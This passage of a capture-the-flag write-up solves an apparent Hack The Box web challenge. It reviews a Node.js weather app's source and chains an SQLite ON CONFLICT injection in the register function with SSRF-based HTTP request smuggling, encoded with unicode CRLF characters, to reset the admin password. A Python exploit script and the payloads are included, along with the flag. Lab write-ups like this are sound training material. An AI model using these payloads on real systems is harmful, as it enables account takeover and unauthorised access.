+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sqlite</span>.<span style="color:#a6e22e">open</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">db_file</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">migrate</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            DROP TABLE IF EXISTS users;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            CREATE TABLE IF NOT EXISTS users (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                username   VARCHAR(255) NOT NULL UNIQUE,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                password   VARCHAR(255) NOT NULL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            );
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            INSERT INTO users (username, password) VALUES (&#39;admin&#39;, &#39;</span><span style="color:#e6db74">${</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">32</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;hex&#39;</span>) <span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        `</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">register</span>(<span style="color:#a6e22e">user</span>, <span style="color:#a6e22e">pass</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// TODO: add parameterization and roll public
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">reject</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`INSERT INTO users (username, password) VALUES (&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">user</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">pass</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)`</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">resolve</span>((<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">query</span>)));
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reject</span>(<span style="color:#a6e22e">e</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">isAdmin</span>(<span style="color:#a6e22e">user</span>, <span style="color:#a6e22e">pass</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">reject</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">smt</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;SELECT username FROM users WHERE username = ? and password = ?&#39;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">row</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">smt</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">user</span>, <span style="color:#a6e22e">pass</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">resolve</span>(<span style="color:#a6e22e">row</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">undefined</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">row</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reject</span>(<span style="color:#a6e22e">e</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Database</span>;
+</span></span></code></pre></div><p>and so we see that it creates the <code>admin</code>with a random password, has an <code>isAdmin</code>function as well and a <code>register</code>function that seems to be vulnerable to <code>SQLi</code>as can also be seen with the comment:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#a6e22e">register</span>(<span style="color:#a6e22e">user</span>, <span style="color:#a6e22e">pass</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// TODO: add parameterization and roll public
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">reject</span>) =&gt; {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`INSERT INTO users (username, password) VALUES (&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">user</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">pass</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)`</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">resolve</span>((<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">query</span>)));
+</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">reject</span>(<span style="color:#a6e22e">e</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	});
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>==&gt; This could then be used to update the password with a payload such as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">123</span><span style="color:#e6db74">&#39;) ON CONFLICT(username) DO UPDATE SET password = &#39;</span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;;--
+</span></span></span></code></pre></div><p>we then need to find a way to bypass this check in the <code>index.js</code>file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">remoteAddress</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/^.*:/</span>, <span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">end</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">username</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">password</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">register</span>(<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span>)
+</span></span><span style="display:flex;"><span>					.<span style="color:#a6e22e">then</span>(()  =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Successfully registered&#39;</span>)))
+</span></span><span style="display:flex;"><span>					.<span style="color:#66d9ef">catch</span>(() =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Something went wrong&#39;</span>)));
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Missing parameters&#39;</span>));
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>==&gt; From here we remember the <code>/api/weather</code> endpoint that allowed for <code>POST</code>requests and took <code>endpoint</code>as a parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">endpoint</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;api.openweathermap.org&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">res</span>  <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;//ip-api.com/json/&#39;</span>)
+</span></span><span style="display:flex;"><span>        .<span style="color:#66d9ef">catch</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">weather</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;img src=&#39;/static/host-unreachable.jpg&#39;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;br&gt;&lt;br&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;h4&gt;👨‍🔧 Disable blocker addons&lt;/h2&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            `</span>;
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">countryCode</span>, <span style="color:#a6e22e">city</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/api/weather&#39;</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">endpoint</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">endpoint</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">city</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">city</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">country</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">countryCode</span>,
+</span></span><span style="display:flex;"><span>        }),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    });
+</span></span></code></pre></div><p>we can then look for a <code>SSRF</code>vulnerability in here, which we could use to exploit the <code>SQLi</code>identified earlier. Checking the controller for this, we have:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/api/weather&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">endpoint</span>, <span style="color:#a6e22e">city</span>, <span style="color:#a6e22e">country</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">endpoint</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">city</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">country</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">WeatherHelper</span>.<span style="color:#a6e22e">getWeather</span>(<span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">endpoint</span>, <span style="color:#a6e22e">city</span>, <span style="color:#a6e22e">country</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Missing parameters&#39;</span>));
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>==&gt; We see that the <code>WeatherHelper.getWeather()</code>function gets called &ndash;&gt; we can have a look at it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">HttpHelper</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;../helpers/HttpHelper&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">getWeather</span>(<span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">endpoint</span>, <span style="color:#a6e22e">city</span>, <span style="color:#a6e22e">country</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// *.openweathermap.org is out of scope
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">apiKey</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10a62430af617a949055a46fa6dec32f&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">weatherData</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">HttpHelper</span>.<span style="color:#a6e22e">HttpGet</span>(<span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">endpoint</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/data/2.5/weather?q=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">city</span><span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">country</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;units=metric&amp;appid=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">apiKey</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>); 
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">weatherData</span>.<span style="color:#a6e22e">name</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">weatherDescription</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">weatherData</span>.<span style="color:#a6e22e">weather</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">description</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">weatherIcon</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">weatherData</span>.<span style="color:#a6e22e">weather</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">icon</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">weatherTemp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">weatherData</span>.<span style="color:#a6e22e">main</span>.<span style="color:#a6e22e">temp</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">switch</span> (parseInt(<span style="color:#a6e22e">weatherIcon</span>)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">weatherIcon</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;icon-clouds&#39;</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">9</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">weatherIcon</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;icon-rain&#39;</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">11</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">weatherIcon</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;icon-storm&#39;</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">13</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">weatherIcon</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;icon-snow&#39;</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">weatherIcon</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;icon-sun&#39;</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>({
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">desc</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">weatherDescription</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">icon</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">weatherIcon</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">temp</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">weatherTemp</span>,
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>        } 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`Could not find </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">city</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> or </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">country</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>} 
+</span></span></code></pre></div><p>and so it uses the helper function <code>HttpHelper.HttpGet()</code>to send a <code>GET</code>request and retrieve parameters for this specific city.</p>
+<p>==&gt; Now that we have all of this, we can actually make a script to overwrite the admin&rsquo;s password, using both the <code>SQLi</code>payload combined with the <code>SSRF</code>vulnerability in an encoded <code>HTTP smuggling request</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://94.237.53.230:40051&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;123&#39;) ON CONFLICT(username) DO UPDATE SET password = &#39;admin&#39;;--&#34;</span>
+</span></span><span style="display:flex;"><span>parsedUsername <span style="color:#f92672">=</span> username<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u0120</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;%27&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#34;%22&#34;</span>)
+</span></span><span style="display:flex;"><span>parsedPassword <span style="color:#f92672">=</span> password<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\u0120</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;%27&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#34;%22&#34;</span>)
+</span></span><span style="display:flex;"><span>contentLength <span style="color:#f92672">=</span> len(parsedUsername) <span style="color:#f92672">+</span> len(parsedPassword) <span style="color:#f92672">+</span> <span style="color:#ae81ff">19</span>
+</span></span><span style="display:flex;"><span>endpoint <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;127.0.0.1/</span><span style="color:#ae81ff">\u0120</span><span style="color:#e6db74">HTTP/1.1</span><span style="color:#ae81ff">\u010D\u010A</span><span style="color:#e6db74">Host:</span><span style="color:#ae81ff">\u0120</span><span style="color:#e6db74">127.0.0.1</span><span style="color:#ae81ff">\u010D\u010A\u010D\u010A</span><span style="color:#e6db74">POST</span><span style="color:#ae81ff">\u0120</span><span style="color:#e6db74">/register</span><span style="color:#ae81ff">\u0120</span><span style="color:#e6db74">HTTP/1.1</span><span style="color:#ae81ff">\u010D\u010A</span><span style="color:#e6db74">Host:</span><span style="color:#ae81ff">\u0120</span><span style="color:#e6db74">127.0.0.1</span><span style="color:#ae81ff">\u010D\u010A</span><span style="color:#e6db74">Content-Type:</span><span style="color:#ae81ff">\u0120</span><span style="color:#e6db74">application/x-www-form-urlencoded</span><span style="color:#ae81ff">\u010D\u010A</span><span style="color:#e6db74">Content-Length:</span><span style="color:#ae81ff">\u0120</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> str (contentLength) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u010D\u010A\u010D\u010A</span><span style="color:#e6db74">username=&#39;</span><span style="color:#f92672">+</span>parsedUsername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&amp;password=&#39;</span><span style="color:#f92672">+</span> parsedPassword <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u010D\u010A\u010D\u010A</span><span style="color:#e6db74">GET</span><span style="color:#ae81ff">\u0120</span><span style="color:#e6db74">/?lol=&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>city<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;test&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>country<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;test&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;endpoint&#39;</span>:endpoint,<span style="color:#e6db74">&#39;city&#39;</span>:city,<span style="color:#e6db74">&#39;country&#39;</span>:country}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>res<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/api/weather&#39;</span>,json<span style="color:#f92672">=</span>json)
+</span></span></code></pre></div><p>This will combine both the <code>SQLi</code>that we found earlier, by using the <code>SQLite</code>&rsquo;s <code>ON CONFLICT</code>keyword to change the <code>admin</code> password to <code>admin</code>and using <code>SSRF-based request smuggling</code> to send the request to the <code>/register</code>endpoint.</p>
+<p>(For this, we need the different special characters to be encoded such as spaces, newlines, &hellip; We then use these replacements: <code>\u0120</code>, <code>%27</code>, <code>%22</code>)</p>
+<p>Once ran, we can simply login as <code>admin:admin</code>and we get the flag:</p>
+<p>==&gt; <strong><code>HTB{w3lc0m3_t0_th3_p1p3_dr34m}</code></strong></p>
+
+		</div>
+		<footer class="post__footer">
+			
+<div class="post__tags tags clearfix">
